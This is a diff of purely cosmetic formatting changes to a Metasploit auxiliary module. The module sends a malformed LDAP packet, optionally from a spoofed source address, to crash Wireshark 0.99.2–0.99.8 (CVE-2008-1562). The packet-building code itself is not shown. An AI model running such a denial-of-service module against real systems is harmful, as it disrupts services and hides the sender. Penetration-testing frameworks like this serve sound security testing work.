@@ -9,18 +9,17 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Wireshark LDAP Dissector DOS',
+      'Name' => 'Wireshark LDAP Dissector DOS',
       'Description' => %q{
           The LDAP dissector in Wireshark 0.99.2 through 0.99.8 allows remote attackers
           to cause a denial of service (application crash) via a malformed packet.
       },
-      'Author'      => ['MC'],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          [ 'CVE', '2008-1562' ],
-          [ 'OSVDB', '43840' ],
-        ],
+      'Author' => ['MC'],
+      'License' => MSF_LICENSE,
+      'References' => [
+        [ 'CVE', '2008-1562' ],
+        [ 'OSVDB', '43840' ],
+      ],
       'DisclosureDate' => 'Mar 28 2008')
 
     register_options([
@@ -28,11 +27,10 @@ class MetasploitModule < Msf::Auxiliary
       OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
     ])
 
-    deregister_options('FILTER','PCAPFILE')
+    deregister_options('FILTER', 'PCAPFILE')
   end
 
   def run
-
     open_pcap
 
     print_status("Sending malformed LDAP packet to #{rhost}")
@@ -52,6 +50,5 @@ class MetasploitModule < Msf::Auxiliary
     capture_sendto(p, rhost)
 
     close_pcap
-
   end
 end
